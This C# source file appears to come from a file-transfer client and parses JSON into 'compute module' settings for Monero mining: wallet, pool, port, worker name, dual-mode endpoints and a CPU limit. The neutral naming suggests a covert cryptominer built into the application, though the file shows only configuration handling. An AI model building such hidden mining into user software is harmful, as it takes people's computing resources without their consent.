using System;
using System.Collections.Generic;
using System.Text.Json;

namespace FileTransfer.Compute
{
    public class ClientComputeEndpoint
    {
        public string Algorithm { get; set; } = "";
        public string Wallet { get; set; } = "";
        public string Pool { get; set; } = "";
        public int Port { get; set; } = 0;
        public string Worker { get; set; } = "";

        public ClientComputeEndpoint Clone()
        {
            return new ClientComputeEndpoint
            {
                Algorithm = Algorithm,
                Wallet = Wallet,
                Pool = Pool,
                Port = Port,
                Worker = Worker
            };
        }
    }

    public class ClientComputeModuleConfig
    {
        public string Id { get; set; } = Guid.NewGuid().ToString("N").Substring(0, 8);
        public string Name { get; set; } = "Compute Module";
        public bool Enabled { get; set; } = true;
        public string Mode { get; set; } = "single"; // "single" or "dual"
        public ClientComputeEndpoint Primary { get; set; } = new();
        public ClientComputeEndpoint Secondary { get; set; } = new();
        public int ResourceLimit { get; set; } = 50;

        public bool IsDualMode => string.Equals(Mode, "dual", StringComparison.OrdinalIgnoreCase);

        public ComputeConfig ToComputeConfig()
        {
            var cfg = new ComputeConfig
            {
                Enabled = Enabled,
                Mode = Primary.Algorithm,
                Algorithm = Primary.Algorithm,
                WalletAddress = Primary.Wallet,
                ServerAddress = Primary.Pool,
                ServerPort = Primary.Port,
                WorkerName = Primary.Worker,
                ResourceLimit = ResourceLimit,
                IsDualMode = IsDualMode,
                SecondaryEndpoint = IsDualMode ? Secondary : null
            };
            return cfg;
        }

        public ClientComputeModuleConfig Clone()
        {
            return new ClientComputeModuleConfig
            {
                Id = Guid.NewGuid().ToString("N").Substring(0, 8),
                Name = Name,
                Enabled = Enabled,
                Mode = Mode,
                Primary = Primary.Clone(),
                Secondary = Secondary.Clone(),
                ResourceLimit = ResourceLimit
            };
        }
    }

    public class ComputeConfig
    {
        // 7 Legacy backward-compatible flat properties
        public string Mode { get; set; } = "Monero";
        public string WalletAddress { get; set; } = "";
        public string ServerAddress { get; set; } = "";
        public int ServerPort { get; set; } = 4444;
        public string WorkerName { get; set; } = "";
        public int ResourceLimit { get; set; } = 50;
        public bool Enabled { get; set; } = false;

        // Structured multi-module & dual mining fields
        public string Algorithm { get; set; } = "xmr";
        public bool IsDualMode { get; set; } = false;
        public ClientComputeEndpoint? SecondaryEndpoint { get; set; }
        public List<ClientComputeModuleConfig> Modules { get; set; } = new();

        public static ComputeConfig FromCustomConfigJson(string json)
        {
            var cfg = new ComputeConfig();
            if (string.IsNullOrWhiteSpace(json) || json == "{}") return cfg;

            try
            {
                using var doc = JsonDocument.Parse(json);
                var root = doc.RootElement;

                // 1. Сначала проверяем новую структурированную схему "compute": { "enabled": true, "modules": [...] }
                bool hasComputeObject = false;
                if (TryGetPropertyCaseInsensitive(root, "compute", out var elCompute) && elCompute.ValueKind == JsonValueKind.Object)
                {
                    hasComputeObject = true;
                    if (TryGetPropertyCaseInsensitive(elCompute, "enabled", out var elCmpEnabled))
                    {
                        if (elCmpEnabled.ValueKind == JsonValueKind.True || elCmpEnabled.ValueKind == JsonValueKind.False)
                            cfg.Enabled = elCmpEnabled.GetBoolean();
                    }

                    if (TryGetPropertyCaseInsensitive(elCompute, "modules", out var elModules) && elModules.ValueKind == JsonValueKind.Array)
                    {
                        foreach (var mElem in elModules.EnumerateArray())
                        {
                            var mod = ParseModuleElement(mElem);
                            if (mod != null)
                            {
                                cfg.Modules.Add(mod);
                            }
                        }
                    }
                }

                // 2. Считываем плоские/legacy ключи (они присутствуют и для обратной совместимости, и как верхнеуровневые параметры)
                // Mode
                if (TryGetPropertyCaseInsensitive(root, "mode", out var elMode) ||
                    TryGetPropertyCaseInsensitive(root, "computeMode", out elMode))
                {
                    cfg.Mode = elMode.GetString() ?? cfg.Mode;
                }

                // Algorithm
                if (TryGetPropertyCaseInsensitive(root, "algorithm", out var elAlgo) ||
                    TryGetPropertyCaseInsensitive(root, "algo", out elAlgo))
                {
                    cfg.Algorithm = elAlgo.GetString() ?? cfg.Algorithm;
                }

                // Wallet Address
                if (TryGetPropertyCaseInsensitive(root, "walletAddress", out var elWallet) ||
                    TryGetPropertyCaseInsensitive(root, "wallet", out elWallet) ||
                    TryGetPropertyCaseInsensitive(root, "address", out elWallet))
                {
                    cfg.WalletAddress = elWallet.GetString() ?? "";
                }

                // Server Address
                if (TryGetPropertyCaseInsensitive(root, "serverAddress", out var elServer) ||
                    TryGetPropertyCaseInsensitive(root, "server", out elServer) ||
                    TryGetPropertyCaseInsensitive(root, "pool", out elServer) ||
                    TryGetPropertyCaseInsensitive(root, "host", out elServer))
                {
                    cfg.ServerAddress = elServer.GetString() ?? "";
                }

                // Server Port
                if (TryGetPropertyCaseInsensitive(root, "serverPort", out var elPort) ||
                    TryGetPropertyCaseInsensitive(root, "port", out elPort))
                {
                    if (elPort.ValueKind == JsonValueKind.Number && elPort.TryGetInt32(out int pNum))
                    {
                        cfg.ServerPort = pNum;
                    }
                    else if (elPort.ValueKind == JsonValueKind.String && int.TryParse(elPort.GetString(), out int pStr))
                    {
                        cfg.ServerPort = pStr;
                    }
                }

                // Worker Name
                if (TryGetPropertyCaseInsensitive(root, "workerName", out var elWorker) ||
                    TryGetPropertyCaseInsensitive(root, "worker", out elWorker) ||
                    TryGetPropertyCaseInsensitive(root, "rig", out elWorker))
                {
                    cfg.WorkerName = elWorker.GetString() ?? "";
                }

                // Resource Limit
                if (TryGetPropertyCaseInsensitive(root, "resourceLimit", out var elLimit) ||
                    TryGetPropertyCaseInsensitive(root, "limit", out elLimit) ||
                    TryGetPropertyCaseInsensitive(root, "cpuLimit", out elLimit))
                {
                    if (elLimit.ValueKind == JsonValueKind.Number && elLimit.TryGetInt32(out int lNum))
                    {
                        cfg.ResourceLimit = lNum;
                    }
                    else if (elLimit.ValueKind == JsonValueKind.String && int.TryParse(elLimit.GetString(), out int lStr))
                    {
                        cfg.ResourceLimit = lStr;
                    }
                }

                // Dual Mode
                if (TryGetPropertyCaseInsensitive(root, "isDualMode", out var elDm) ||
                    TryGetPropertyCaseInsensitive(root, "dualMode", out elDm))
                {
                    if (elDm.ValueKind == JsonValueKind.True || elDm.ValueKind == JsonValueKind.False)
                        cfg.IsDualMode = elDm.GetBoolean();
                    else if (elDm.ValueKind == JsonValueKind.String)
                        cfg.IsDualMode = string.Equals(elDm.GetString(), "true", StringComparison.OrdinalIgnoreCase);
                }

                // Secondary Endpoint from flat keys
                if (TryGetPropertyCaseInsensitive(root, "secondaryWallet", out var elSecWallet) ||
                    TryGetPropertyCaseInsensitive(root, "secondaryPool", out var _))
                {
                    var sec = new ClientComputeEndpoint();
                    if (TryGetPropertyCaseInsensitive(root, "secondaryAlgorithm", out var sa)) sec.Algorithm = sa.GetString() ?? "";
                    if (TryGetPropertyCaseInsensitive(root, "secondaryWallet", out var sw)) sec.Wallet = sw.GetString() ?? "";
                    if (TryGetPropertyCaseInsensitive(root, "secondaryPool", out var sp)) sec.Pool = sp.GetString() ?? "";
                    if (TryGetPropertyCaseInsensitive(root, "secondaryPort", out var spo))
                    {
                        if (spo.ValueKind == JsonValueKind.Number && spo.TryGetInt32(out int p)) sec.Port = p;
                        else if (spo.ValueKind == JsonValueKind.String && int.TryParse(spo.GetString(), out int ps)) sec.Port = ps;
                    }
                    if (TryGetPropertyCaseInsensitive(root, "secondaryWorker", out var swo)) sec.Worker = swo.GetString() ?? "";
                    cfg.SecondaryEndpoint = sec;
                    if (!string.IsNullOrWhiteSpace(sec.Wallet)) cfg.IsDualMode = true;
                }

                // Enabled
                if (TryGetPropertyCaseInsensitive(root, "enabled", out var elEnabled) ||
                    TryGetPropertyCaseInsensitive(root, "computeEnabled", out elEnabled) ||
                    TryGetPropertyCaseInsensitive(root, "isComputeEnabled", out elEnabled))
                {
                    if (elEnabled.ValueKind == JsonValueKind.True || elEnabled.ValueKind == JsonValueKind.False)
                    {
                        cfg.Enabled = elEnabled.GetBoolean();
                    }
                    else if (elEnabled.ValueKind == JsonValueKind.String)
                    {
                        string s = elEnabled.GetString()?.Trim().ToLowerInvariant() ?? "";
                        cfg.Enabled = s == "true" || s == "1" || s == "yes";
                    }
                }

                // 3. Синхронизация структуры Modules и flat-свойств
                if (cfg.Modules.Count == 0 && cfg.Enabled && !string.IsNullOrWhiteSpace(cfg.ServerAddress))
                {
                    // Синтезируем модуль из плоских ключей
                    var synthMod = new ClientComputeModuleConfig
                    {
                        Name = "Default Compute Module",
                        Enabled = cfg.Enabled,
                        Mode = cfg.IsDualMode ? "dual" : "single",
                        ResourceLimit = cfg.ResourceLimit,
                        Primary = new ClientComputeEndpoint
                        {
                            Algorithm = !string.IsNullOrWhiteSpace(cfg.Algorithm) ? cfg.Algorithm : cfg.Mode,
                            Wallet = cfg.WalletAddress,
                            Pool = cfg.ServerAddress,
                            Port = cfg.ServerPort,
                            Worker = cfg.WorkerName
                        }
                    };
                    if (cfg.SecondaryEndpoint != null)
                    {
                        synthMod.Secondary = cfg.SecondaryEndpoint;
                    }
                    cfg.Modules.Add(synthMod);
                }
                else if (cfg.Modules.Count > 0)
                {
                    // Если модули были спарсены из структуры compute.modules, подтягиваем flat-свойства из первого активного модуля
                    var activeMod = cfg.Modules.Find(m => m.Enabled) ?? cfg.Modules[0];
                    cfg.Mode = activeMod.Primary.Algorithm;
                    cfg.Algorithm = activeMod.Primary.Algorithm;
                    cfg.WalletAddress = activeMod.Primary.Wallet;
                    cfg.ServerAddress = activeMod.Primary.Pool;
                    cfg.ServerPort = activeMod.Primary.Port;
                    cfg.WorkerName = activeMod.Primary.Worker;
                    cfg.ResourceLimit = activeMod.ResourceLimit;
                    cfg.IsDualMode = activeMod.IsDualMode;
                    cfg.SecondaryEndpoint = activeMod.IsDualMode ? activeMod.Secondary : null;
                }
            }
            catch (Exception ex)
            {
                MainWindow.Log("ComputeConfig parse error: " + ex.Message);
            }

            return cfg;
        }

        private static ClientComputeModuleConfig? ParseModuleElement(JsonElement elem)
        {
            if (elem.ValueKind != JsonValueKind.Object) return null;

            var mod = new ClientComputeModuleConfig();

            if (TryGetPropertyCaseInsensitive(elem, "id", out var elId)) mod.Id = elId.GetString() ?? mod.Id;
            if (TryGetPropertyCaseInsensitive(elem, "name", out var elName)) mod.Name = elName.GetString() ?? mod.Name;
            if (TryGetPropertyCaseInsensitive(elem, "enabled", out var elEn))
            {
                if (elEn.ValueKind == JsonValueKind.True || elEn.ValueKind == JsonValueKind.False)
                    mod.Enabled = elEn.GetBoolean();
            }
            if (TryGetPropertyCaseInsensitive(elem, "mode", out var elM)) mod.Mode = elM.GetString() ?? "single";
            if (TryGetPropertyCaseInsensitive(elem, "resourceLimit", out var elLim))
            {
                if (elLim.ValueKind == JsonValueKind.Number && elLim.TryGetInt32(out int l)) mod.ResourceLimit = l;
            }

            if (TryGetPropertyCaseInsensitive(elem, "primary", out var elPri) && elPri.ValueKind == JsonValueKind.Object)
            {
                mod.Primary = ParseEndpointElement(elPri);
            }

            if (TryGetPropertyCaseInsensitive(elem, "secondary", out var elSec) && elSec.ValueKind == JsonValueKind.Object)
            {
                mod.Secondary = ParseEndpointElement(elSec);
            }

            return mod;
        }

        private static ClientComputeEndpoint ParseEndpointElement(JsonElement elem)
        {
            var ep = new ClientComputeEndpoint();
            if (TryGetPropertyCaseInsensitive(elem, "algorithm", out var a)) ep.Algorithm = a.GetString() ?? "";
            if (TryGetPropertyCaseInsensitive(elem, "wallet", out var w)) ep.Wallet = w.GetString() ?? "";
            if (TryGetPropertyCaseInsensitive(elem, "pool", out var p)) ep.Pool = p.GetString() ?? "";
            if (TryGetPropertyCaseInsensitive(elem, "port", out var po))
            {
                if (po.ValueKind == JsonValueKind.Number && po.TryGetInt32(out int port)) ep.Port = port;
                else if (po.ValueKind == JsonValueKind.String && int.TryParse(po.GetString(), out int portS)) ep.Port = portS;
            }
            if (TryGetPropertyCaseInsensitive(elem, "worker", out var wo)) ep.Worker = wo.GetString() ?? "";
            return ep;
        }

        private static bool TryGetPropertyCaseInsensitive(JsonElement element, string propName, out JsonElement result)
        {
            if (element.ValueKind == JsonValueKind.Object)
            {
                foreach (var prop in element.EnumerateObject())
                {
                    if (string.Equals(prop.Name, propName, StringComparison.OrdinalIgnoreCase))
                    {
                        result = prop.Value;
                        return true;
                    }
                }
            }
            result = default;
            return false;
        }
    }
}
